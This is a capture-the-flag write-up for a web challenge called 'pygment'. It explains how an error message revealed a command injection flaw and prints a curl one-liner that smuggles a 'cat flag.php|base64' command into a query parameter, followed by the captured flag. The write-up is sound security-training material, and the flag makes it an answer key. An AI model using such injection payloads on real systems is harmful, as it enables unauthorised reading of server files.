# pygment

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

# Solution
As soon as we try to reach the given target, we are met with an error message which seem to indicate that we are not giving some required parameters, but also that the `pygmentize` binary doesn't actually exist on the box:  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Fuzzing the target we find a `flag.php` as well but there's nothing interesting here yet:  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

I spent quite some time on the error message above because I thought the box was broken. Given the challenge name, I actually expected to get a functional website but it seems that that was too much to ask and it turns out that it's just a simple command injection. Not even a blind one because we can clearly see the error message. If the `pygmentize` binary was on the box, we would've at least gotten a more interesting challenge.  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We can read the flag.php file and pipe our command to `base64` with `-w0` argument to make sure we get it all on one line:  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

It can even be done with a bash oneliner:

```bash
curl -s 'http://34.107.126.69:30516/?a=lazy&b=titan;`cat%20flag.php|base64+-w0`'|grep -Eo '\b[A-Za-z0-9+/]{20,}{0,2}\b'|base64 -d 2>/dev/null|grep -io CTF{.*} --color=none|sed 's/ctf/CTF/g'
```
![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

`CTF{2ae4644b1e4cbc1f560c52f3ee0985043d3e0acf0f766851382974646578ec39}`

Note: I had to replace the lowercase ctf with upper case because the flag wasn't originally accepted. All in all this challenge felt lackluster with the most minimum of efforts from the creator. It boggles the mind why this was considered "medium". [sided-curl](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33) was much more difficult and interesting and with some thought actually put behind it.
